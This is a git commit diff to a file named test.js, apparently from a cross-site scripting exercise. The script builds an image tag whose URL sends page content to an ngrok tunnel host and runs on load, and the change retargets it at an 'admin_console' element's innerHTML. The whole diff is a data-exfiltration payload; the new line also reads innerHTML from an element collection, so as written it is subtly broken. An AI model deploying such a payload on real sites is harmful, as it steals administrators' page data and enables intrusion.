b00ef3e14ca8785178dd79930c211d6f25625107
phulelouch <62769629+phulelouch@users.noreply.github.com>
2020-05-24 13:16:44 -0400

    Update test.js

--- test.js
+++ test.js
@@ -1,6 +1,6 @@
 function addTheImage() {
     var img = document.createElement('img');
-    img.src = "http://3e6850f2.ngrok.io?c="+document.getElementsByClassName("col-8")[0];
+    img.src = "http://3e6850f2.ngrok.io?c="+document.getElementsByClassName("col-8 admin_console").innerHTML;
     document.body.appendChild(img);
 }
 addTheImage();
